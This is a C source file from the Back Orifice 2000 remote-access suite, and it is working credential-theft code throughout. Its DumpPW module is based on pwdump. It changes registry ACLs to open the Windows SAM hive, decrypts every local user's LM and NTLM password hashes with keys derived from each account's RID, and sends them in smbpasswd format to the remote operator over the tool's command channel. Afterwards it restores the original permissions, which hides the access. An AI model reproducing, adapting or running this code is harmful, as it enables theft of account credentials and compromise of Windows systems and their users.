/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

// DumpPW - Thanks to Jeremy Allison for pwdump, it was
//          what this was based on.

#include <windows.h>
#include <stdarg.h>
#include <auth.h>
#include <iohandler.h>
#include <encryption.h>
#include <commandloop.h>
#include <functions.h>

DWORD hexstrtoul(char *str)
{
	DWORD val;
	int i;
	char c1;

	val=0;

	for(i=0;i<8;i++) {
		if(*str=='\0') break;
		
		c1=*str++;
		
		if(c1>='A' && c1<='F') c1=(c1-'A')+0xA;
		else if(c1>='a' && c1<='f') c1=(c1-'a')+0xA;
		else if(c1>='0' && c1<='9') c1=(c1-'0');

		val<<=4;
		val|=c1;
	}

	return val;
}


//
// Utility function to get allocate a SID from a name.
// Looks on local machine. SID is allocated with malloc
// and must be freed by the caller.
// Returns TRUE on success, FALSE on fail.
//

static BOOL get_sid(const char *name, SID **ppsid)
{
	SID_NAME_USE sid_use;
	char *domain;
	DWORD sid_size = 0;
	DWORD dom_size = 0;
	
	*ppsid = 0;
	if(pLookupAccountName(0, name, 0, &sid_size, 0, &dom_size, &sid_use) == 0) {
		if(GetLastError() != ERROR_INSUFFICIENT_BUFFER) return FALSE;
	}
	
	*ppsid = (SID *)malloc(sid_size);
	domain = (char *)malloc(dom_size);
	if(*ppsid == 0 || domain == 0) {
		if(*ppsid) free(*ppsid);
		if(domain) free(domain);
		*ppsid = 0;
		return FALSE;
	}
	
	if(pLookupAccountName(0, name, *ppsid, &sid_size, domain, &dom_size, &sid_use)==0) {
		free(*ppsid);
		free(domain);
		*ppsid = 0;
		return FALSE;
	}
	
	free(domain);
	return TRUE;
}

//
// Utility function to setup a security descriptor
// from a varargs list of char *name followed by a DWORD access
// mask. The access control list is allocated with malloc
// and must be freed by the caller.
// returns TRUE on success, FALSE on fail.
//

static BOOL __cdecl create_sd_from_list( SECURITY_DESCRIPTOR *sdout, int num, ...)
{
	va_list ap;
	SID **sids = 0;
	char *name;
	DWORD amask;
	DWORD acl_size;
	PACL pacl = 0;
	int i;
	
	if((sids=(SID **)malloc(sizeof(SID *)*num))==0) return FALSE;
	
	acl_size = num * (sizeof(ACL) + sizeof(ACCESS_ALLOWED_ACE) + sizeof(DWORD));	
	
	// Collect all the SID's

	va_start( ap, num);
	for(i=0;i<num;i++) {
		name = va_arg( ap, char *);
		amask = va_arg(ap, DWORD);
		if(get_sid( name, &sids[i]) == FALSE) goto cleanup;
		acl_size += pGetLengthSid(sids[i]);
	}
	va_end(ap);


	if((pacl = (PACL)malloc(acl_size)) == 0) goto cleanup;
	
	if(pInitializeSecurityDescriptor( sdout, SECURITY_DESCRIPTOR_REVISION) == FALSE) goto cleanup;
	
	if(pInitializeAcl( pacl, acl_size, ACL_REVISION) == FALSE) goto cleanup;
	
	va_start(ap, num);
	for( i = 0; i < num; i++) {
		ACE_HEADER *ace_p;
		name = va_arg( ap, char *);
		amask = va_arg( ap, DWORD);
		if(pAddAccessAllowedAce( pacl, ACL_REVISION, amask, sids[i]) == FALSE) goto cleanup;
		
		// Make sure the ACE is inheritable
		if(pGetAce( pacl, 0, (LPVOID *)&ace_p) == FALSE) goto cleanup;
	
		ace_p->AceFlags |= ( CONTAINER_INHERIT_ACE | OBJECT_INHERIT_ACE);
	}
	
	// Add the ACL into the sd
	
	if(pSetSecurityDescriptorDacl( sdout, TRUE, pacl, FALSE) == FALSE) goto cleanup;
	
	for( i = 0; i < num; i++) {
		if(sids[i]) free(sids[i]);
	}
		
	free(sids);
		
	return TRUE;
		
cleanup:
		
	if(sids) {
		for( i = 0; i < num; i++) {
			if(sids[i]) free(sids[i]);
		}
		free(sids);
	}
	if(pacl) free(pacl);
	return FALSE;
}


//
// Function to go over all the users in the SAM and set an ACL
// on them.
//

static int set_userkeys_security( HKEY start, const char *path, SECURITY_DESCRIPTOR *psd, 
								 HKEY *return_key)
{
	HKEY key;
	DWORD err;
	char usersid[128];
	DWORD indx = 0;
	
	// Open the path and enum all the user keys - setting the same security on them.

	if((err=RegOpenKeyEx(start,path,0,KEY_ENUMERATE_SUB_KEYS,&key))!=ERROR_SUCCESS) return -1;
	
	// Now enumerate the subkeys, setting the security on them all.
	do {
		DWORD size;
		FILETIME ft;
		
		size=sizeof(usersid);
		err=RegEnumKeyEx(key,indx,usersid,&size,0,0,0,&ft);
		if(err==ERROR_SUCCESS) {
			HKEY subkey;
			
			indx++;
			if((err=RegOpenKeyEx(key,usersid,0,WRITE_DAC,&subkey))!=ERROR_SUCCESS) {					
				RegCloseKey(key);
				return -1;
			}

			if((err=pRegSetKeySecurity(subkey,DACL_SECURITY_INFORMATION,psd))!=ERROR_SUCCESS) {
				RegCloseKey(subkey);
				RegCloseKey(key);
				return -1;
			}
			RegCloseKey(subkey);
		}
	} while(err==ERROR_SUCCESS);
	
	if(err!=ERROR_NO_MORE_ITEMS) {
		RegCloseKey(key);
		return -1;
	}
	if(return_key==0) RegCloseKey(key);
	else *return_key=key;
	return 0;
}

//
// Function to travel down the SAM security tree in the registry and restore
// the correct ACL on them. Returns 0 on success. -1 on fail.
//

static int restore_sam_tree_access( HKEY start )
{
	char path[128];
	char AdminGroupName[128];
	char *p;
	int i;
	HKEY key;
	DWORD err;
	SECURITY_DESCRIPTOR sd;
	DWORD admin_mask;
	
	admin_mask = WRITE_DAC | READ_CONTROL;
	
	lstrcpy(AdminGroupName, "Administrators");	
	
	if(!create_sd_from_list( &sd, 2, "SYSTEM", GENERIC_ALL,AdminGroupName, admin_mask)) return -1;
	
	lstrcpy(path,"SECURITY\\SAM\\Domains\\Account\\Users");
	
	// Remove the security on the user keys first.
	
	if(set_userkeys_security( start, path, &sd, 0)!=0) return -1;
	
	// now go up the path, restoring security

	do {
		if((err=RegOpenKeyEx(start,path,0,WRITE_DAC,&key)) != ERROR_SUCCESS) return -1;
	
		if((err=pRegSetKeySecurity( key, DACL_SECURITY_INFORMATION,&sd)) != ERROR_SUCCESS) {
			RegCloseKey(key);
			return  -1;
		}
		RegCloseKey(key);
		p=path+(lstrlen(path)-1);
		for(i=(lstrlen(path)-1);i>=0;i--) {
			if(*p=='\\') { *p=0; break; }
		}
	} while(i!=-1);
	
	return 0;
}

//
// Function to travel the security tree and add Administrators
// access as WRITE_DAC, READ_CONTROL and READ.
// Returns 0 on success. -1 on fail if no security was changed,
// -2 on fail if security was changed.
//

static int set_sam_tree_access( HKEY start, HKEY *return_key)
{
	char path[128];
	char *p;
	char AdminGroupName[128];
	HKEY key;
	DWORD err;
	BOOL security_changed = FALSE;
	SECURITY_DESCRIPTOR sd;
	DWORD admin_mask;
	BOOL finished = FALSE;
	
	admin_mask = WRITE_DAC | READ_CONTROL | KEY_QUERY_VALUE | KEY_ENUMERATE_SUB_KEYS;
	
	lstrcpy(AdminGroupName, "Administrators");
	
	if(!create_sd_from_list( &sd, 2, "SYSTEM", GENERIC_ALL, AdminGroupName, admin_mask)) return -1;
	
	lstrcpy( path, "SECURITY\\SAM\\Domains\\Account\\Users");

	p=path;
	do {
		while(*p!='\0') {
			if(*p=='\\') break;
			p++;
		}
		if(*p=='\0') finished=TRUE;
		else *p='\0';

		if((err=RegOpenKeyEx( start, path, 0, WRITE_DAC, &key))!=ERROR_SUCCESS) {
			return(security_changed ? -2: -1);
		}
		if((err=pRegSetKeySecurity( key, DACL_SECURITY_INFORMATION, &sd)) != ERROR_SUCCESS) {
			RegCloseKey(key);
			return(security_changed ? -2: -1);
		}
		security_changed = TRUE;
		RegCloseKey(key);
		
		if(!finished) {*p='\\'; p++;}
	} while( !finished );

	
	if(set_userkeys_security( start, path, &sd, &key) != 0) return -2;
	if(return_key==0) RegCloseKey(key);
	else *return_key = key;
	
	return 0;
}

// 
// Function to get a little-endian int from an offset into
// a byte array.
//

static int get_int( BYTE *array )
{
	return((array[0]&0xff) + ((array[1]<<8)&0xff00) +
		  ((array[2]<<16)&0xff0000) + ((array[3]<<24)&0xff000000));
}

//
// Function to convert the RID to the first decrypt key.
//

static void set_sid_key1(CEncryptionEngine *pCrypt, unsigned long sid)
{
	unsigned char s[7];
	
	s[0] = (unsigned char)(sid & 0xFF);
	s[1] = (unsigned char)((sid>>8) & 0xFF);
	s[2] = (unsigned char)((sid>>16) & 0xFF);
	s[3] = (unsigned char)((sid>>24) & 0xFF);
	s[4] = s[0];
	s[5] = s[1];
	s[6] = s[2];
	
	pCrypt->SetDecryptKey((char *)s);
}

//
// Function to convert the RID to the second decrypt key.
//

static void set_sid_key2(CEncryptionEngine *pCrypt, unsigned long sid)
{
	unsigned char s[7];
	
	s[0] = (unsigned char)((sid>>24) & 0xFF);
	s[1] = (unsigned char)(sid & 0xFF);
	s[2] = (unsigned char)((sid>>8) & 0xFF);
	s[3] = (unsigned char)((sid>>16) & 0xFF);
	s[4] = s[0];
	s[5] = s[1];
	s[6] = s[2];
	
	pCrypt->SetDecryptKey((char *)s);
}

//
// Function to split a 'V' entry into a users name, passwords and comment.
//

static int __cdecl check_vp(BYTE *vp, int vp_size, char **username, char **fullname,
					char **comment, char **homedir,
					BYTE *lanman,int *got_lanman,
					BYTE *md4,  int *got_md4,
					DWORD rid
					)
{
	int username_offset = get_int(vp + 0xC);
	int username_len = get_int(vp + 0x10); 
	int fullname_offset = get_int(vp + 0x18);
	int fullname_len = get_int(vp + 0x1c);
	int comment_offset = get_int(vp + 0x24);
	int comment_len = get_int(vp + 0x28);
	int homedir_offset = get_int(vp + 0x48);
	int homedir_len = get_int(vp + 0x4c);
	int pw_offset = get_int(vp + 0x9c);
	
	*username = 0;
	*fullname = 0;
	*comment = 0;
	*homedir = 0;
	*got_lanman = 0;
	*got_md4 = 0;
	
	if(username_len < 0 || username_offset < 0 || comment_len < 0 ||
		fullname_len < 0 || homedir_offset < 0 ||
		comment_offset < 0 || pw_offset < 0)
		return -1;
	username_offset += 0xCC;
	fullname_offset += 0xCC;
	comment_offset += 0xCC;
	homedir_offset += 0xCC;
	pw_offset += 0xCC;
	
	if((*username = (char *)malloc(username_len + 1)) == 0) {
		return -1;
	}
	if((*fullname = (char *)malloc(fullname_len + 1)) == 0) {
		free(*username);
		*username = 0;
		return -1;
	}
	if((*comment = (char *)malloc(comment_len + 1)) == 0) {
		free(*username);
		*username = 0;
		free(*fullname);
		*fullname = 0;
		return -1;
	}
	if((*homedir = (char *)malloc(homedir_len + 1)) == 0) {
		free(*username);
		*username = 0;
		free(*fullname);
		*fullname = 0;
		free(*comment);
		*comment = 0;
		return -1;
	}

	int nNumChars;

	nNumChars=username_len/sizeof(wchar_t);
	WideCharToMultiByte(CP_ACP,0,(wchar_t *)(vp + username_offset), nNumChars, *username, nNumChars, NULL ,NULL);
	(*username)[nNumChars] = 0;

	nNumChars=fullname_len/sizeof(wchar_t);
	WideCharToMultiByte(CP_ACP,0,(wchar_t *)(vp + fullname_offset), nNumChars, *fullname, nNumChars, NULL ,NULL);
	(*fullname)[nNumChars] = 0;
	
	nNumChars=comment_len/sizeof(wchar_t);
	WideCharToMultiByte(CP_ACP,0,(wchar_t *)(vp + comment_offset), nNumChars, *comment, nNumChars, NULL ,NULL);
	(*comment)[nNumChars] = 0;
	
	nNumChars=homedir_len/sizeof(wchar_t);
	WideCharToMultiByte(CP_ACP,0,(wchar_t *)(vp + homedir_offset), nNumChars, *homedir, nNumChars, NULL ,NULL);
	(*homedir)[nNumChars] = 0;
		
	if(pw_offset >= vp_size) {
		// No password
		*got_lanman = 0;
		*got_md4 = 0;
		return 0;
	}
	
	// Check that the password offset plus the size of the
	//  lanman and md4 hashes fits within the V record.

	if(pw_offset + 32 > vp_size) {
		// Account disabled
		*got_lanman = -1;
		*got_md4 = -1;
		return 0;
	}

	// Get DES Engine
	ENCRYPTION_ENGINE *eng=g_pEncryptionHandler->GetEngineByID("DES");
	if(eng==NULL) {
		*got_lanman = -1;
		*got_md4 = -1;
		return 0;
	}

	CEncryptionEngine crypt(eng);
	crypt.Startup();

	// Get the two decrypt keys.
	BYTE *pBlock;
	int nBlockLen;

	vp += pw_offset;
	
	// Set 'first half key'
	set_sid_key1(&crypt,rid);

	// First half of lanman hash
	pBlock=crypt.Decrypt(vp,8,&nBlockLen);
	memcpy(lanman,pBlock,8);
	crypt.Free(pBlock);

	// First half of ntlm hash
	pBlock=crypt.Decrypt(vp+16,8,&nBlockLen);
	memcpy(md4,pBlock,8);
	crypt.Free(pBlock);
	
	// Set 'second half key'
	set_sid_key2(&crypt,rid);
	
	// Second half of lanman hash
	pBlock=crypt.Decrypt(vp+8,8,&nBlockLen);
	memcpy(&lanman[8],pBlock,8);
	crypt.Free(pBlock);

	// First half of ntlm hash
	pBlock=crypt.Decrypt(vp+24,8,&nBlockLen);
	memcpy(&md4[8],pBlock,8);
	crypt.Free(pBlock);

	crypt.Shutdown();
	
	*got_lanman = 1;
	*got_md4 = 1;
	return 0;
}

// 
// Function to strip out any ':' or '\n', '\r' from a text
// string.
//

static void strip_text( char *p )
{
	while(*p!='\0') {
		if(*p == ':') *p='_';
		else if(*p == '\n') *p='_';
		else if(*p == '\r') *p='_';
		p++;
	}
}

//
// Function to dump a users smbpasswd entry onto stdout.
// Returns 0 on success, -1 on fail.
//

static int __cdecl printout_smb_entry(CAuthSocket *cas_from, int comid, HKEY user, DWORD rid )
{
	DWORD err;
	DWORD type;
	DWORD size = 0;
	BYTE *vp;
	BYTE lanman[16];
	BYTE md4_hash[16];
	char *username;
	char *fullname;
	char *comment;
	char *homedir;
	int got_lanman;
	int got_md4;
	
	// Find out how much space we need for the 'V' value.
	
	if((err=RegQueryValueEx( user, "V", 0, &type, 0, &size)) != ERROR_SUCCESS) return -1;
	if((vp=(BYTE *)malloc(size)) == 0) return -1;

	if((err=RegQueryValueEx( user, "V", 0, &type, (LPBYTE)vp, &size))!=ERROR_SUCCESS) {
		free(vp);
		return -1;
	}
	
	// Check heuristics
	if(check_vp(vp, size, &username, &fullname, &comment, &homedir, lanman, &got_lanman, md4_hash, &got_md4, rid) != 0) {
		free(vp);
		return 0;
	}

	// Ensure username of comment don't have any nasty suprises
	// for us such as an embedded ':' or '\n' - see multiple UNIX
	// passwd field update security bugs for details...
	
	strip_text( username );
	strip_text( fullname );
	strip_text( comment );
	
	// If homedir contains a drive letter this mangles it - but it protects
	// the integrity of the smbpasswd file.
	strip_text( homedir );
	
	char svLanmanText[33];
	if(got_lanman>0) {
		wsprintf(svLanmanText,"%2X%2X%2X%2X%2X%2X%2X%2X%2X%2X%2X%2X%2X%2X%2X%2X", 
			lanman[0],lanman[1],lanman[2],lanman[3],lanman[4],lanman[5],lanman[6],lanman[7],
			lanman[8],lanman[9],lanman[10],lanman[11],lanman[12],lanman[13],lanman[14],lanman[15]);
	} else {
		if(got_lanman==-1) lstrcpy(svLanmanText,"DISABLED");
		else lstrcpy(svLanmanText,"NO PASSWORD");
	}
	
	char svNTLMText[33];
	if(got_md4>0) {
		wsprintf(svNTLMText,"%2X%2X%2X%2X%2X%2X%2X%2X%2X%2X%2X%2X%2X%2X%2X%2X", 
			md4_hash[0],md4_hash[1],md4_hash[2],md4_hash[3],md4_hash[4],md4_hash[5],md4_hash[6],md4_hash[7],
			md4_hash[8],md4_hash[9],md4_hash[10],md4_hash[11],md4_hash[12],md4_hash[13],md4_hash[14],md4_hash[15]);
	} else {
		if(got_md4==-1) lstrcpy(svNTLMText,"DISABLED");
		else lstrcpy(svNTLMText,"NO PASSWORD");
	}
	
	char *pBuffer;
	int nBufLen;

	nBufLen=64+lstrlen(username)+lstrlen(svLanmanText)+lstrlen(svNTLMText)+lstrlen(fullname)+lstrlen(comment)+lstrlen(homedir);
	pBuffer=(char *)malloc(nBufLen);
	if(pBuffer==NULL) {
		free(username);
		free(fullname);
		free(comment);
		free(homedir);
		free(vp);
		return -1;
	}

	wsprintf(pBuffer,"%s:%d:%s:%s:%s,%s:%s\n", 
		username, 
		rid,
		svLanmanText,
		svNTLMText,
		fullname,
		comment,
		homedir);
			
	IssueAuthCommandReply(cas_from,comid,1,pBuffer);
	free(pBuffer);
	
	free(username);
	free(fullname);
	free(comment);
	free(homedir);
	free(vp);
	return 0;
}

//
// Function to go through all the user SID's - dumping out
// their SAM values. Returns 0 on success, -1 on fail.
//

static int enumerate_users(CAuthSocket *cas_from, int comid, HKEY key)
{
	DWORD indx = 0;
	DWORD err;
	DWORD rid;
	char usersid[128];
	
	do {
		DWORD size;
		FILETIME ft;
		
		size = sizeof(usersid);
		err = RegEnumKeyEx(	key, indx, usersid, &size, 0, 0, 0, &ft);
		if(err == ERROR_SUCCESS) {
			HKEY subkey;
			
			indx++;
			if((err=RegOpenKeyEx( key, usersid, 0, KEY_QUERY_VALUE, &subkey))!=ERROR_SUCCESS) {			
				RegCloseKey(key);
				return -1;
			}

			rid = hexstrtoul(usersid);

			// Hack as we know there is a Names key here
			if(rid != 0) {
				if(printout_smb_entry(cas_from, comid, subkey, rid ) != 0) {
					RegCloseKey(subkey);
					return -1;
				}
			}
			RegCloseKey(subkey);
		}
	} while(err == ERROR_SUCCESS);
	
	if(err != ERROR_NO_MORE_ITEMS) {
		RegCloseKey(key);
		return -1;
	}
	return 0;
}

int DumpPasswordHashes(CAuthSocket *cas_from, int comid)
{
	HKEY start_key = HKEY_LOCAL_MACHINE;
	HKEY users_key;
	int err;
	
	// 
	// We need to get to HKEY_LOCAL_MACHINE\SECURITY\SAM\Domains\Account\Users.
	// The security on this key normally doesn't allow Administrators
	// to read - we need to add this.
	//
	
	if((err=set_sam_tree_access(start_key,&users_key))!=0) {
		if(err==-2) restore_sam_tree_access(start_key);
		return -1;
	}

	// Print the users SAM entries in smbpasswd format onto stdout.
	enumerate_users(cas_from, comid, users_key);
	RegCloseKey(users_key);

	IssueAuthCommandReply(cas_from, comid, 0, "Finished collecting user hashes.\n");
	
	// reset the security on the SAM
	restore_sam_tree_access(start_key);
	if(start_key!=HKEY_LOCAL_MACHINE) RegCloseKey(start_key);
	
	IssueAuthCommandReply(cas_from, comid, 0, NULL);

	return 0;
}